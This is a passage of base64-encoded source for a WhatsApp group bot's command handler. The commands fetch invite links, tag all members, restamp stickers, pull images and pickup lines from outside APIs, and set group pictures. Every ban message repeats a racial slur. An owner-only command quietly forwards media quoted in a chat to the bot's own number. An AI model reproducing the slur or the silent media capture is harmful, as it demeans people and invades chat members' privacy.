mYWxzZSwgaWQ6IG0ucXVvdGVkLmlkLCBwYXJ0aWNpcGFudDogbS5xdW90ZWQuc2VuZGVyIH0gfSkKICAgICAgICAgICAgfQogICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnbGlua2dyb3VwJzogY2FzZSAnbGlua2djJzogY2FzZSAnZ2NsaW5rJzogY2FzZSAnZ3JvdXBsaW5rJzogewogICAgICAgICAgICBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKaWYgKCFtLmlzR3JvdXApIHJldHVybiByZXBseShtZXNzLm9ubHkuZ3JvdXApCmlmICghaXNCb3RBZG1pbnMpIHJldHVybiByZXBseSgnX0JvdCBtdXN0IGJlIGFkbWluXycpCmxldCByZXNwb25zZSA9IGF3YWl0IHJpY2guZ3JvdXBJbnZpdGVDb2RlKG0uY2hhdCkKcmljaC5zZW5kVGV4dChtLmNoYXQsIGBodHRwczovL2NoYXQud2hhdHNhcHAuY29tLyR7cmVzcG9uc2V9XG5cbkdyb3VwIExpbmsgOiAke2dyb3VwTWV0YWRhdGEuc3ViamVjdH1gLCBtLCB7IGRldGVjdExpbms6IHRydWUgfSkKICAgICAgICAgICAgfQogICAgICAgICAgICBicmVhazsKIGNhc2UgJ2pvaW4nOiB7CiBpZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIGlmICghaXNDcmVhdG9yKSByZXR1cm4gcmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwppZiAoIXRleHQpIHJldHVybiByZXBseShgZXhhbXBsZSAke3ByZWZpeCtjb21tYW5kfSBsaW5rZ2NgKQppZiAoIWlzVXJsKGFyZ3NbMF0pICYmICFhcmdzWzBdLmluY2x1ZGVzKCd3aGF0c2FwcC5jb20nKSkgcmV0dXJuIHJlcGx5KCdMaW5rIEludmFsaWQhJykKbGV0IHJlc3VsdCA9IGFyZ3NbMF0uc3BsaXQoJ2h0dHBzOi8vY2hhdC53aGF0c2FwcC5jb20vJylbMV0KYXdhaXQgcmljaC5ncm91cEFjY2VwdEludml0ZShyZXN1bHQpCmF3YWl0IHJlcGx5KGBEb25lYCkKfQpicmVhazsKY2FzZSAndGFnJzoKY2FzZSAndG90YWcnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIW0uaXNHcm91cCkgcmV0dXJuIHJlcGx5KG1lc3Mub25seS5ncm91cCkKaWYgKCFpc0FkbWlucykgcmV0dXJuIHJlcGx5KCcqZm9yIGFkbWlucyBvbmx5IGJybyonKQppZiAoIWlzQm90QWRtaW5zKSByZXR1cm4gcmVwbHkoJ19Cb3QgbXVzdCBiZSBhZG1pbiBmaXJzdCDwn4CEXycpCiAgICAgICAgICAgICAgIGlmICghbS5xdW90ZWQpIHJldHVybiByZXBseShgUmVwbHkgbWVzc2FnZSB3aXRoIGNhcHRpb24gJHtwcmVmaXggKyBjb21tYW5kfWApCiAgICAgICAgICAgICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGZvcndhcmQ6IG0ucXVvdGVkLmZha2VPYmosIG1lbnRpb25zOiBwYXJ0aWNpcGFudHMubWFwKGEgPT4gYS5pZCkgfSkKICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICBicmVhazsKLy8gY2FzZSBzdGVhbCBzdGlja2VyCmNhc2UgJ3JpY2gnOiBjYXNlICdzdGVhbCc6IGNhc2UgJ3N0aWNrZXJ3bSc6IGNhc2UgJ3Rha2UnOiBjYXNlICd3bSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgY29uc3QgZ2V0UmFuZG9tID0gKGV4dCkgPT4gewogICAgICAgICAgICByZXR1cm4gYCR7TWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTAwMDApfSR7ZXh0fWAKICAgICAgICB9CglsZXQgYWh1aCA9IGFyZ3Muam9pbignICcpLnNwbGl0KCd8JykKCWxldCBzYXR1ID0gYWh1aFswXSAhPT0gJycgPyBhaHVoWzBdIDogYFJpY2hpZSBpcyBoaW1gCglsZXQgZHVhID0gdHlwZW9mIGFodWhbMV0gIT09ICdBS0FORS1NRCcgPyBhaHVoWzFdIDogYEFLQU5FLU1EYAoJbGV0IHsgU3RpY2tlciwgY3JlYXRlU3RpY2tlciwgU3RpY2tlclR5cGVzIH0gPSByZXF1aXJlKCd3YS1zdGlja2VyLWZvcm1hdHRlcicpCglsZXQgbWVkaWEgPSBhd2FpdCByaWNoLmRvd25sb2FkQW5kU2F2ZU1lZGlhTWVzc2FnZShxdW90ZWQpCglsZXQgamFuY29rID0gbmV3IFN0aWNrZXIobWVkaWEsIHsKCXBhY2s6IHNhdHUsIC8vIFRoZSBwYWNrIG5hbWUKCWF1dGhvcjogZHVhLCAvLyBUaGUgYXV0aG9yIG5hbWUKCXR5cGU6IFN0aWNrZXJUeXBlcy5GVUxMLCAvLyBUaGUgc3RpY2tlciB0eXBlCgljYXRlZ29yaWVzOiBbJ/CfpKknLCAn8J+OiSddLCAvLyBUaGUgc3RpY2tlciBjYXRlZ29yeQoJaWQ6ICcxMjM0NScsIC8vIFRoZSBzdGlja2VyIGlkCglxdWFsaXR5OiA3MCwgLy8gVGhlIHF1YWxpdHkgb2YgdGhlIG91dHB1dCBmaWxlCgliYWNrZ3JvdW5kOiAnI0ZGRkZGRjAwJyAvLyBUaGUgc3RpY2tlciBiYWNrZ3JvdW5kIGNvbG9yIChvbmx5IGZvciBmdWxsIHN0aWNrZXJzKQoJfSkKCWxldCBzdG9rID0gZ2V0UmFuZG9tKCIud2VicCIpCglsZXQgbm9ubyA9IGF3YWl0IGphbmNvay50b0ZpbGUoc3RvaykKCWxldCBuYWggPSBmcy5yZWFkRmlsZVN5bmMobm9ubykKCWF3YWl0IHJpY2guc2VuZE1lc3NhZ2UoZnJvbSx7c3RpY2tlcjogbmFofSx7cXVvdGVkOiBtfSkKCWF3YWl0IGZzLnVubGlua1N5bmMoc3RvaykKCWF3YWl0IGZzLnVubGlua1N5bmMobWVkaWEpCn0KCWJyZWFrOwoKY2FzZSAnY291cGxlLXBwJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIHRyeSB7CiAgICAgICAgY29uc3QgYXBpVXJsID0gJ2h0dHBzOi8vYXBpcy5kYXZpZGN5cmlsdGVjaC5teS5pZC9jb3VwbGVwcCc7CiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBheGlvcy5nZXQoYXBpVXJsKTsKICAgICAgICBjb25zdCBkYXRhID0gcmVzcG9uc2UuZGF0YTsKCiAgICAgICAgaWYgKGRhdGEuc3RhdHVzID09PSAyMDAgJiYgZGF0YS5zdWNjZXNzKSB7CiAgICAgICAgICAgIGNvbnN0IG1hbGVJbWFnZVVybCA9IGRhdGEubWFsZTsKICAgICAgICAgICAgY29uc3QgZmVtYWxlSW1hZ2VVcmwgPSBkYXRhLmZlbWFsZTsKCiAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSB7CiAgICAgICAgICAgICAgICB0ZXh0OiAnQ291cGxlIFByb2ZpbGUgUGljdHVyZXMnLAogICAgICAgICAgICAgICAganBlZ1RodW1ibmFpbDogbnVsbCAvLyBZb3UgY2FuIHNldCBhIGRlZmF1bHQgdGh1bWJuYWlsIGlmIG5lZWRlZAogICAgICAgICAgICB9OwoKICAgICAgICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgaW1hZ2U6IHsgdXJsOiBtYWxlSW1hZ2VVcmwgfSwgY2FwdGlvbjogJ01hbGUgSW1hZ2UnIH0sIHsgcXVvdGVkOiBtZXNzIH0pOwogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6IGZlbWFsZUltYWdlVXJsIH0sIGNhcHRpb246ICdGZW1hbGUgSW1hZ2UnIH0sIHsgcXVvdGVkOiBtZXNzIH0pOwoKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXBseShgRmFpbGVkIHRvIGZldGNoIGNvdXBsZSBwcm9maWxlIHBpY3R1cmVzOiAke2RhdGEubWVzc2FnZSB8fCAnVW5rbm93biBlcnJvcid9YCk7CiAgICAgICAgfQogICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBpbiBjb3VwbGUtcHAgY29tbWFuZDoiLCBlcnJvcik7CiAgICAgICAgcmVwbHkoYEFuIGVycm9yIG9jY3VycmVkIHdoaWxlIGZldGNoaW5nIGNvdXBsZSBwcm9maWxlIHBpY3R1cmVzOiAke2Vycm9yLm1lc3NhZ2UgfHwgJ1Vua25vd24gZXJyb3InfWApOwogICAgfQogICAgfQogICAgYnJlYWs7IApjYXNlICdyZWFkbW9yZSc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CmNvbnN0IG1vcmUgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKDgyMDYpCmNvbnN0IHJlYWRtb3JlID0gbW9yZS5yZXBlYXQoNDAwMSkKbGV0IFtsLCByXSA9IHRleHQuc3BsaXRgfGAKICAgIGlmICghbCkgbCA9ICcnCiAgICBpZiAoIXIpIHIgPSAnJwphd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwge3RleHQ6IGwgKyByZWFkbW9yZSArIHJ9LCB7cXVvdGVkOiBtfSkKfQpicmVhazsKY2FzZSAnZG93bmxvYWQnOgpjYXNlICdzYXZlJzoKY2FzZSAnc3Z0JzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwogIGNvbnN0IHF1b3RlZE1lc3NhZ2UgPSBtLm1zZy5jb250ZXh0SW5mby5xdW90ZWRNZXNzYWdlOwogIGlmIChxdW90ZWRNZXNzYWdlKSB7CiAgICBpZiAocXVvdGVkTWVzc2FnZS5pbWFnZU1lc3NhZ2UpIHsKICAgICAgbGV0IGltYWdlQ2FwdGlvbiA9IHF1b3RlZE1lc3NhZ2UuaW1hZ2VNZXNzYWdlLmNhcHRpb247CiAgICAgIGxldCBpbWFnZVVybCA9IGF3YWl0IHJpY2guZG93bmxvYWRBbmRTYXZlTWVkaWFNZXNzYWdlKHF1b3RlZE1lc3NhZ2UuaW1hZ2VNZXNzYWdlKTsKICAgICAgcmljaC5zZW5kTWVzc2FnZShib3ROdW1iZXIsIHsgaW1hZ2U6IHsgdXJsOiBpbWFnZVVybCB9LCBjYXB0aW9uOiBpbWFnZUNhcHRpb24gfSk7CiAgICB9CiAgICBpZiAocXVvdGVkTWVzc2FnZS52aWRlb01lc3NhZ2UpIHsKICAgICAgbGV0IHZpZGVvQ2FwdGlvbiA9IHF1b3RlZE1lc3NhZ2UudmlkZW9NZXNzYWdlLmNhcHRpb247CiAgICAgIGxldCB2aWRlb1VybCA9IGF3YWl0IHJpY2guZG93bmxvYWRBbmRTYXZlTWVkaWFNZXNzYWdlKHF1b3RlZE1lc3NhZ2UudmlkZW9NZXNzYWdlKTsKICAgICAgcmljaC5zZW5kTWVzc2FnZShib3ROdW1iZXIsIHsgdmlkZW86IHsgdXJsOiB2aWRlb1VybCB9LCBjYXB0aW9uOiB2aWRlb0NhcHRpb24gfSk7CiAgICB9CiAgfQp9CmJyZWFrOwogICAgY2FzZSAicml6eiI6CmNhc2UgInBpY2t1cC1saW5lIjogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICB0cnkgewogICAgY29uc3QgYXBpVXJsID0gYGh0dHBzOi8vYXBpcy5kYXZpZGN5cmlsdGVjaC5teS5pZC9waWNrdXBsaW5lYDsKICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgYXhpb3MuZ2V0KGFwaVVybCk7CiAgICBjb25zdCBkYXRhID0gcmVzcG9uc2UuZGF0YTsKCiAgICBpZiAoZGF0YS5zdGF0dXMgPT09IDIwMCAmJiBkYXRhLnN1Y2Nlc3MpIHsKICAgICAgY29uc3QgcGlja3VwbGluZSA9IGRhdGEucGlja3VwbGluZTsKICAgICAgYXdhaXQgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsCiAgICAgICB7CiAgICAgICAgdGV4dDogcGlja3VwbGluZQogICAgICB9LCB7IHF1b3RlZDogbSB9KTsgLy8gQWRkIHF1b3RlZCBvcHRpb24gZm9yIGNvbnRleHQKICAgIH0gZWxzZSB7CiAgICAgIHJlcGx5KGBJbnZhbGlkIFJlc3BvbnNlIEZyb20gVGhlIEFQSTogJHtkYXRhLm1lc3NhZ2UgfHwgIlVua25vd24gZXJyb3IifWApOyAvLyBEaXNwbGF5IHNwZWNpZmljIGVycm9yIG1lc3NhZ2UKICAgIH0KICB9IGNhdGNoIChjYXNlRXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoIkFuIEVycm9yIE9jY3VycmVkOiIsIGNhc2VFcnJvcik7CiAgICByZXBseShgQW4gRXJyb3IgT2NjdXJyZWQ6ICR7Y2FzZUVycm9yLm1lc3NhZ2UgfHwgIlVua25vd24gZXJyb3IifWApOyAvLyBQcm92aWRlIG1vcmUgc3BlY2lmaWMgZXJyb3IKICB9CiAgfQogIGJyZWFrOwpjYXNlICdjcmVhdGVsb2dvJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICBpZiAoIXRleHQpIHsKICAgIHJldHVybiBtLnJlcGx5KCIgRW50ZXIgdGhlIGxvZ28gdGl0bGUsIGlkZWEgYW5kIHNsb2dhbi4gRm9ybWF0OiAubG9nb2dlbiBUaXRsZXxJZGVhfFNsb2dhbiIpOwogIH0KCiAgY29uc3QgW3RpdGxlLCBpZGVhLCBzbG9nYW5dID0gdGV4dC5zcGxpdCgifCIpOwoKICBpZiAoIXRpdGxlIHx8ICFpZGVhIHx8ICFzbG9nYW4pIHsKICAgIHJldHVybiBtLnJlcGx5KCIgSW5jb3JyZWN0IGZvcm1hdC4gVXNlIDogLmxvZ29nZW4gVGl0bGV8SWRlYXxTbG9nYW5cblxuKkV4YW1wbGUgOiogLmxvZ29nZW4gcmljaGllfHRoZWdvYXR8IGFsd2F5cyIpOwogIH0KCiAgdHJ5IHsKICAgIGNvbnN0IHBheWxvYWQgPSB7CiAgICAgIGFpX2ljb246IFszMzMyNzYsIDMzMzI3OV0sCiAgICAgIGhlaWdodDogMzAwLAogICAgICBpZGVhOiBpZGVhLAogICAgICBpbmR1c3RyeV9pbmRleDogIk4iLAogICAgICBpbmR1c3RyeV9pbmRleF9pZDogIiIsCiAgICAgIHBhZ2VzaXplOiA0LAogICAgICBzZXNzaW9uX2lkOiAiIiwKICAgICAgc2xvZ2FuOiBzbG9nYW4sCiAgICAgIHRpdGxlOiB0aXRsZSwKICAgICAgd2hpdGVFZGdlOiA4MCwKICAgICAgd2lkdGg6IDQwMAogICAgfTsKCiAgICBjb25zdCB7IGRhdGEgfSA9IGF3YWl0IGF4aW9zLnBvc3QoImh0dHBzOi8vd3d3LnNvbG9nby5haS92MS9hcGkvbG9nby9sb2dvX2dlbmVyYXRlIiwgcGF5bG9hZCk7CiAgICAKICAgIGlmICghZGF0YS5kYXRhLmxvZ29MaXN0IHx8IGRhdGEuZGF0YS5sb2dvTGlzdC5sZW5ndGggPT09IDApIHsKICAgICAgcmV0dXJuIG0ucmVwbHkoIkZhaWxlZCB0byBDcmVhdGUgTG9nbyIpOwogICAgfQoKICAgIGNvbnN0IGxvZ29VcmxzID0gZGF0YS5kYXRhLmxvZ29MaXN0Lm1hcChsb2dvID0+IGxvZ28ubG9nb190aHVtYik7CiAgICAKICAgIGZvciAoY29uc3QgdXJsIG9mIGxvZ29VcmxzKSB7CiAgICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGltYWdlOiB7IHVybDogdXJsIH0gfSk7CiAgICB9CiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGdlbmVyYXRpbmcgbG9nbzoiLCBlcnJvcik7CiAgICBhd2FpdCBtLnJlcGx5KCJGYWlsZWQgdG8gQ3JlYXRlIExvZ28iKTsKICB9Cn07CmJyZWFrOwoKY2FzZSAnc2V0cHBncm91cCc6IGNhc2UgJ3NldHBwZ3J1cCc6IGNhc2UgJ3NldHBwZ2MnOiB7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwppZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoJ2BgYG93bmVyIG9ubHlgYGAnKQppZiAoIW0uaXNHcm91cCkgdGhyb3cgbWVzcy5ncm91cAppZiAoIWlzQWRtaW5zKSB0aHJvdyBtZXNzLmFkbWluCmlmICghL2ltYWdlLy50ZXN0KG1pbWUpKSB0aHJvdyBgdGhyaW0vUmVwbHkgSW1hZ2UgIENhcHRpb24gJHtwcmVmaXggKyBjb21tYW5kfWAKaWYgKC93ZWJwLy50ZXN0KG1pbWUpKSB0aHJvdyBgdGhyaW0vUmVwbHkgSW1hZ2UgIENhcHRpb24gJHtwcmVmaXggKyBjb21tYW5kfWAKbGV0IG1lZGlhID0gYXdhaXQgcmljaC5kb3dubG9hZEFuZFNhdmVNZWRpYU1lc3NhZ2UobSkKYXdhaXQgcmljaC51cGRhdGVQcm9maWxlUGljdHVyZShtLmNoYXQsIHsgdXJsOiBtZWRpYSB9KS5jYXRjaCgoZXJyKSA9PiBmcy51bmxpbmtTeW5jKG1lZGlhKSkKbS5yZXBseSgnZG9uZScpCn0KYnJlYWs7CmNhc2UgJ293bmVyJzogewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGNvbnN0IGtvbnRhayA9IHsKICAgICAgICAiZGlzcGxheU5hbWUiOiAnUklDSElFJywKICAgICAgICB2Y2FyZDogYEJFR0lOOlZDQVJEXG5WRVJTSU9OOjMuMFxuTjo7Ozs7XG5GTjogJHtnbG9iYWwubmFtYX1cbml0ZW0xLlRFTDt3YWlkPSR7Z2xvYmFsLm93bmVyfToke2dsb2JhbC5vd25lcn1cbml0ZW0xLlgtQUJMYWJlbDpcblBsZWFzZSBEb24ndCBTcGFtIE15IE93bmVyXG5VUkw7RW1haWwgT3duZXI6JHtnbG9iYWwubmFtYX1AZ21haWwuY29tXG5PUkc6IE1ZIE9XTkVSXG5FTkQ6VkNBUkRgCiAgICB9OwoKICAgIGF3YWl0IHJpY2guc2VuZE1lc3NhZ2UoZnJvbSwgewogICAgICAgIGNvbnRhY3RzOiB7IGNvbnRhY3RzOiBba29udGFrXSB9LAogICAgICAgIGNvbnRleHRJbmZvOiB7CiAgICAgICAgICAgIGZvcndhcmRpbmdTY29yZTogOTk5LCAKICAgICAgICAgICAgaXNGb3J3YXJkZWQ6IGZhbHNlLCAKICAgICAgICAgICAgbWVudGlvbmVkSmlkOiBbc2VuZGVyXSwKICAgICAgICAgICAgImV4dGVybmFsQWRSZXBseSI6IHsKICAgICAgICAgICAgICAgICJzaG93QWRBdHRyaWJ1dGlvbiI6IHRydWUsCiAgICAgICAgICAgICAgICAicmVuZGVyTGFyZ2VyVGh1bWJuYWlsIjogdHJ1ZSwKICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJBS0FORSBNRCIsIAogICAgICAgICAgICAgICAgImNvbnRhaW5zQXV0b1JlcGx5IjogdHJ1ZSwKICAgICAgICAgICAgICAgICJtZWRpYVR5cGUiOiAxLCAKICAgICAgICAgICAgICAgICJqcGVnVGh1bWJuYWlsIjogZnMucmVhZEZpbGVTeW5jKCIuL3JpY2guanBnIiksCiAgICAgICAgICAgICAgICAibWVkaWFVcmwiOiAiaHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL3UyZWE5ai5qcGciLAogICAgICAgICAgICAgICAgInNvdXJjZVVybCI6ICJodHRwczovL3doYXRzYXBwLmNvbS9jaGFubmVsLzAwMjlWYXYzcGVrNjV5RDltcVNnZDIxQiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sIHsgcXVvdGVkOiBtIH0pOyAKfQpicmVhazsKIGNhc2UgJ2ltZyc6CmNhc2UgInBpbnRlcmVzdCI6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBpZiAoIXEuaW5jbHVkZXMoInwiKSkgcmV0dXJuIHJlcGx5KCIg8J+AhCAqVXNhZ2U6KiBgLmltZyA8cXVlcnk+IHwgPGFtb3VudD5gXG5cbiAgKkV4YW1wbGU6KiBgLmltZyBOYXJ1dG8gfCA1YCIpOwoKICAgIGxldCBbcXVlcnksIGFtb3VudF0gPSBxLnNwbGl0KCJ8IikubWFwKHQgPT4gdC50cmltKCkpOwogICAgYW1vdW50ID0gcGFyc2VJbnQoYW1vdW50KSB8fCAxOyAvLyBEZWZhdWx0IHRvIDEgaWYgbm8gYW1vdW50IGlzIHByb3ZpZGVkCgogICAgaWYgKGFtb3VudCA+IDIwKSByZXR1cm4gcmVwbHkoIuKaoO+4jyAqQW1vdW50IGV4Y2VlZHMgdGhlIGxpbWl0ISpcblxuTWF4aW11bSBhbGxvd2VkIGltYWdlczogKjIwKiIpOwoKCiAgICB0cnkgewogICAgICAgIGxldCBhcGlVcmwgPSBgaHR0cHM6Ly9kcmFjdWxhenh5LXh5emRyYWMuaGYuc3BhY2UvYXBpL1BpbnRlcmVzdD9xPSR7ZW5jb2RlVVJJQ29tcG9uZW50KHF1ZXJ5KX1gOwoKICAgICAgICBsZXQgaGVhZGVycyA9IHsKICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkxLjAuNDQ3Mi4xMjQgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgICAgICJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJSZWZlcmVyIjogImh0dHBzOi8vd3d3LnBpbnRlcmVzdC5jb20vIiwKICAgICAgICAgICAgIk9yaWdpbiI6ICJodHRwczovL3d3dy5waW50ZXJlc3QuY29tLyIKICAgICAgICB9OwoKICAgICAgICBsZXQgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaChhcGlVcmwsIHsgbWV0aG9kOiAiR0VUIiwgaGVhZGVycyB9KTsKCiAgICAgICAgaWYgKCFyZXNwb25zZS5vaykgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKGDinYwgQVBJIFJlcXVlc3QgRmFpbGVkISBTdGF0dXM6ICR7cmVzcG9uc2Uuc3RhdHVzfWApOwogICAgICAgICAgICByZXR1cm4gcmVwbHkoYOKaoO+4jyAqUGludGVyZXN0IEFQSSBFcnJvcjogJHtyZXNwb25zZS5zdGF0dXN9KlxuXG5UcnkgYWdhaW4gbGF0ZXIuYCk7CiAgICAgICAgfQoKICAgICAgICBsZXQgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgICAgICBjb25zb2xlLmxvZygi8J+UjSBBUEkgUmVzcG9uc2U6IiwgSlNPTi5zdHJpbmdpZnkoZGF0YSwgbnVsbCwgMikpOyAvLyBMb2cgcmVzcG9uc2UgZm9yIGRlYnVnZ2luZwoKICAgICAgICBpZiAoIWRhdGEgfHwgZGF0YS5TVEFUVVMgIT09IDIwMCB8fCAhQXJyYXkuaXNBcnJheShkYXRhLklNQUdFUykgfHwgZGF0YS5JTUFHRVMubGVuZ3RoID09PSAwKSB7CiAgICAgICAgICAgIHJldHVybiByZXBseShg4p2MICpObyBpbWFnZXMgZm91bmQgZm9yOiogKiR7cXVlcnl9KmApOwogICAgICAgIH0KCiAgICAgICAgbGV0IGltYWdlcyA9IGRhdGEuSU1BR0VTLmZpbHRlcihpbWcgPT4gaW1nLmltYWdlKTsgLy8gUmVtb3ZlIG51bGwgaW1hZ2VzCiAgICAgICAgaW1hZ2VzID0gaW1hZ2VzLnNvcnQoKCkgPT4gTWF0aC5yYW5kb20oKSAtIDAuNSk7IC8vIFNodWZmbGUgcmFuZG9tbHkKICAgICAgICBsZXQgc2VudENvdW50ID0gMDsKCiAgICAgICAgZm9yIChsZXQgaXRlbSBvZiBpbWFnZXMpIHsKICAgICAgICAgICAgaWYgKHNlbnRDb3VudCA+PSBhbW91bnQpIGJyZWFrOyAvLyBTdG9wIHdoZW4gd2UgcmVhY2ggdGhlIHJlcXVpcmVkIGFtb3VudAoKICAgICAgICAgICAgbGV0IGltYWdlVXJsID0gaXRlbS5pbWFnZTsKCiAgICAgICAgICAgIC8vICoqQ2hlY2sgaWYgSW1hZ2UgaXMgQWNjZXNzaWJsZSBCZWZvcmUgU2VuZGluZyoqCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBsZXQgY2hlY2tSZXNwb25zZSA9IGF3YWl0IGZldGNoKGltYWdlVXJsLCB7CiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAiSEVBRCIsCiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6IGhlYWRlcnNbIlVzZXItQWdlbnQiXSwKICAgICAgICAgICAgICAgICAgICAgICAgIlJlZmVyZXIiOiAiaHR0cHM6Ly93d3cucGludGVyZXN0LmNvbS8iLAogICAgICAgICAgICAgICAgICAgICAgICAiT3JpZ2luIjogImh0dHBzOi8vd3d3LnBpbnRlcmVzdC5jb20vIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGlmICghY2hlY2tSZXNwb25zZS5vaykgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUud2Fybihg8J+aqCBTa2lwcGluZyBJbWFnZSAoQWNjZXNzIERlbmllZCk6ICR7aW1hZ2VVcmx9YCk7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7IC8vIFNraXAgaW5hY2Nlc3NpYmxlIGltYWdlcwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGxldCBjYXB0aW9uID0gYFxgXGBcYCR7aXRlbS50aXRsZSB8fCAiTm8gVGl0bGUifVxgXGBcYGA7CiAgICAgICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgewogICAgICAgICAgICAgICAgICAgIGltYWdlOiB7IHVybDogaW1hZ2VVcmwgfSwKICAgICAgICAgICAgICAgICAgICBjYXB0aW9uOiBjYXB0aW9uCiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBzZW50Q291bnQrKzsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCAyMDAwKSk7IC8vIDItc2Vjb25kIGRlbGF5CiAgICAgICAgICAgIH0gY2F0Y2ggKGltZ0Vycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCLwn5qoIEltYWdlIEZldGNoIEZhaWxlZDoiLCBpbWdFcnJvci5tZXNzYWdlKTsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOyAvLyBTa2lwIGJyb2tlbiBpbWFnZQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoc2VudENvdW50ID09PSAwKSByZXBseSgi4pqg77iPICpObyBhY2Nlc3NpYmxlIGltYWdlcyBmb3VuZCEqXG5QaW50ZXJlc3QgbWlnaHQgYmUgYmxvY2tpbmcgc29tZSBpbWFnZXMuIik7CiAgICAgICAgCiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoIuKdjCBFcnJvciBpbiBQaW50ZXJlc3QgY2FzZToiLCBlcnJvcik7CiAgICAgICAgcmVwbHkoYOKaoO+4jyAqUGludGVyZXN0IEVycm9yOiAke2Vycm9yLm1lc3NhZ2V9KlxuXG5QbGVhc2UgdHJ5IGFnYWluIGxhdGVyLmApOwogICAgfQp9CmJyZWFrOwpjYXNlICdjaGVja2lkY2gnOiBjYXNlICdpZGNoJzogewppZiAoaXNiY